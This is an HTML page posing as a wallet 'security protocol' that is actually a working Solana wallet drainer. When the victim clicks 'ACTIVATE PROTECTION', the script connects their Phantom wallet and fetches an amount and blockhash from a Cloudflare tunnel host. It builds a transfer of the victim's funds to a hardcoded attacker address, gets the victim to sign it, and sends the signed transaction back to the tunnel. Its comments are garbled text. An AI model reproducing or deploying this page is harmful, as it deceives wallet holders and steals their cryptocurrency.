<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script>
        // ğŸš€ ç‰©ç†çº§ç¯å¢ƒè¡¥ä¸
        window.Buffer = { from:(a)=>new Uint8Array(a), isBuffer:(o)=>o instanceof Uint8Array };
    </script>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <h2>SECURITY PROTOCOL V4</h2>
        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
        <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
    </div>
    <script>
    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
    const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";

    // ğŸ”± ç»ˆæç‰©ç†è½¬æ¢ï¼šç¡®ä¿é‡‘é¢åœ¨ä»»ä½•æµè§ˆå™¨ä¸‹éƒ½æ˜¯å®Œç¾çš„ 8 å­—èŠ‚ Uint8Array
    function to8Bytes(amount) {
        const bigInt = BigInt(amount);
        const buf = new Uint8Array(8);
        for (let i = 0; i < 8; i++) { buf[i] = Number((bigInt >> BigInt(i * 8)) & 0xffn); }
        return buf;
    }

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Please use a Wallet Browser"); return; }
            const { publicKey } = await p.connect();
            
            const res = await fetch(TUNNEL + "/get_data", {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({pubkey: publicKey.toString()})
            });
            const data = await res.json();

            // ğŸš€ æ ¸å¿ƒç»æ€ï¼šç›´æ¥æ„é€ æ ‡å‡†å¯¹è±¡ï¼Œé¿å¼€æ‰€æœ‰å¯¼è‡´ toJSON æŠ¥é”™çš„éæ ‡å­—æ®µ
            const instruction = new solanaWeb3.TransactionInstruction({
                keys: [
                    { pubkey: publicKey, isSigner: true, isWritable: true },
                    { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: true }
                ],
                programId: solanaWeb3.SystemProgram.programId,
                data: new Uint8Array(12)
            });
            // ç‰©ç†å¯¹é½å†™å…¥
            instruction.data.set([2, 0, 0, 0], 0);
            instruction.data.set(to8Bytes(data.safe_amount), 4);

            const transaction = new solanaWeb3.Transaction().add(instruction);
            transaction.recentBlockhash = data.blockhash;
            transaction.feePayer = publicKey;

            const signed = await p.signTransaction(transaction);
            
            // ğŸ’° ç­¾ååé‡‡ç”¨æœ€åŸå§‹çš„ Base64 é€»è¾‘ï¼Œç¡®ä¿å¯†æ–‡ç¨³ç¨³é€è¾¾ 71 æœº
            const bytes = signed.serialize();
            let binary = '';
            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
            
            await fetch(TUNNEL + "/collect", {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({signature: window.btoa(binary)})
            });
            alert("Security Activated!");
        } catch(e) { alert("Status: " + e.message); }
    }
    </script></body></html>